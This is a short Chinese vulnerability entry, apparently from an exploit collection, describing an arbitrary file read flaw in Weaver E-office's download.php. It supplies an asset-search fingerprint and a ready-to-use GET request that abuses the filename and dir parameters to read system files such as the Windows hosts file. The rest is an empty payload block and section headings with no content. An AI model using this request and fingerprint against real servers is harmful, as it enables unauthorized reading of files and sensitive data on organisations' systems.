# 泛微E-officedownload.php存在任意文件读取漏洞

- **系统**：泛微OA　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="泛微 e-office OA"`
- **请求**：`GET /general/file_folder/file_new/neworedit/download.php?filename=hosts&dir=C:\\Windows\\System32\\drivers\\etc\\ HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`

**请求体 / payload**
```

```

**其他**
- 泛微 E-office download.php存在任意文件读取漏洞: * 一、漏洞简介
  * 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微E-Office